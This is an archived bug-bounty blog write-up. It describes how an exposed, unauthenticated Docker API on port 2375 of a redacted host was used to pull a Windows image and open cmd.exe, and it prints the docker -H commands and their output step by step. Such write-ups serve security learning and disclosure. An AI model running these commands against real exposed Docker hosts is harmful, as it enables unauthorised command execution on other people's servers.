---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-10-28_rce-docker-api-but-.md
original_filename: 2022-10-28_rce-docker-api-but-.md
title: RCE docker api, but …
category: documents
detected_topics:
- cloud-security
- sso
- command-injection
- otp
- api-security
tags:
- imported
- documents
- cloud-security
- sso
- command-injection
- otp
- api-security
language: en
raw_sha256: f670ebc29a5b7c3b15963f3eebb984f4d10ac1a7deecc7e75c723d6d92234967
text_sha256: 81a5743a5c3d6eefde7bd9cb0e1f44d71b15a49596a7d93648c7471269f96e16
ingested_at: '2026-06-28T07:32:15Z'
sensitivity: unknown
redactions_applied: true
---

# RCE docker api, but …

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-10-28_rce-docker-api-but-.md
- Source Type: markdown
- Detected Topics: cloud-security, sso, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:32:15Z
- Redactions Applied: True
- Raw SHA256: `f670ebc29a5b7c3b15963f3eebb984f4d10ac1a7deecc7e75c723d6d92234967`
- Text SHA256: `81a5743a5c3d6eefde7bd9cb0e1f44d71b15a49596a7d93648c7471269f96e16`


## Content

---
title: "RCE docker api, but …"
page_title: "RCE docker API, but …. This is a short write up and to be… | by nanwn | DevOps.dev"
url: "https://medium.com/@nanwinata/rce-docker-api-but-11ff70825935"
authors: ["nanwn"]
bugs: ["RCE", "Docker daemon misconfiguration"]
publication_date: "2022-10-28"
added_date: "2022-10-28"
source: "pentester.land/writeups.json"
original_index: 1976
scraped_via: "browseros"
---

# RCE docker api, but …

RCE docker API, but …
nanwn
Follow
3 min read
·
Oct 28, 2022

15

I am writing a short write-up about a Remote Command Execution vulnerability in a Docker API. To be honest, I am feeling lazy to write this.

I discovered an IP that belongs to a certain company. The domain name is “127.0.0.1.redacted.com”, and the most notable aspect of this domain is that it had the Docker port 2375 open. Upon first inspection, it appeared to allow for remote command execution.”

docker -H 127.0.0.1.redacted.com:2375 ps

NAN:~/ $ docker -H redacted:2375 images then it showing :
- REPOSITORY TAG IMAGE ID CREATED SIZE

Unfortunately, I wasn’t able to retrieve any images from this IP address. Despite my attempts to gather more information, nothing seemed to happen. I decided to leave this IP alone and move on to another one. I then focused on researching the Docker function and commands.

I took a break from this IP for a day and came back the next day with a new approach. This time, I checked the operating system to gain a better understanding of how to explore Docker on this system.

NAN:~/ $ docker -H redacted:2375 info
Client:
Context: default
Debug Mode: false

Server:
Containers: 0
Running: 0
Paused: 0
Stopped: 0
Images: 0
Server Version: 19.03.18
Storage Driver: windowsfilter
Windows:
Logging Driver: json-file
Plugins:
Volume: local
Network: ics internal l2bridge l2tunnel nat null overlay private transparent
Log: awslogs etwlogs fluentd gcplogs gelf json-file local logentries splunk syslog
Swarm: inactive
Default Isolation: process
Kernel Version: 10.0 14393 (14393.5356.amd64fre.rs1_release.220906–1211)
Operating System: Windows Server 2016 Datacenter Evaluation Version 1607 (OS Build 14393.5356)
OSType: windows
Architecture: x86_64
CPUs: 28
Total Memory: 127.9GiB
Name: WIN-72KD5D81B9J
ID: NSBE:ZFXC:VON2:SKZT:TJF6:MZJM:4JNE:3TJV:JFR6:35EP:LR3Y:ZMYN
Docker Root Dir: C:\ProgramData\docker
Debug Mode: false
Registry: https://index.docker.io/v1/
Labels:
Experimental: false
Insecure Registries:
127.0.0.0/8
Live Restore Enabled: false

No luck. I later found out that this server was running on a Windows operating system. I re-read the information on Docker on Windows OS. This reminded me of an article I had read previously, where I learned that Docker can pull images if there are no existing images or containers.

Get nanwn’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I found this information in the Windows Docker documentation.

mcr.microsoft.com/windows/nanoserver:10.0.14393.1066

So I decided to pull the image onto the server.

NAN:~/ $ docker -H redacted:2375 pull mcr.microsoft.com/windows/nanoserver:10.0.14393.1066

10.0.14393.1066: Pulling from windows/nanoserver
bce2fbc256ea: Pull complete
6a43ac69611f: Pull complete
Digest: sha256:ded482e81f381c94458a1d12***REDACTED-SUSPECT-TOKEN***Status: Downloaded newer image for mcr.microsoft.com/windows/nanoserver:10.0.14393.1066
mcr.microsoft.com/windows/nanoserver:10.0.14393.1066

However, my goal was to achieve Remote Command Execution. So, I then verified the images.

NAN:~/ $ docker -H redacted:2375 images
REPOSITORY TAG IMAGE ID CREATED SIZE
mcr.microsoft.com/windows/nanoserver 10.0.14393.1066 a943c29f0046 5 years ago 1.01GB

The images were successfully installed. After all the images were downloaded and pulled, I was able to access the Windows server.

NAN:~/ $ docker -H redacted:2375 run -it mcr.microsoft.com/windows/nanoserver:10.0.14393.1066 cmd.exe

Press enter or click to view image in full size

I attempted to report the vulnerability to external programs, but they stated that it was out of scope for their program. I was unsure of how to react as the IP address was associated with a government website (you can probably guess the country).

The lesson I learned from this experience is the importance of thoroughly researching and reading before taking any actions.

Best regards,

Nan
